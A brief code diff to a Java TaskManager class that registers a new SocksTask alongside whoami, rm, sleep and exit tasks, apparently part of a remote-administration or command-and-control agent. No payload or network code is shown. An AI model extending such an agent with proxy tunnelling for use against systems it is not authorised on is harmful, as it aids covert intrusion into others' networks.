@@ -37,6 +37,7 @@ public class TaskManager {
         registerTask(new WhoamiTask());
         registerTask(new RmTask());
         registerTask(new SleepTask());
+        registerTask(new SocksTask());
         registerTask(exitTask);
     }
     
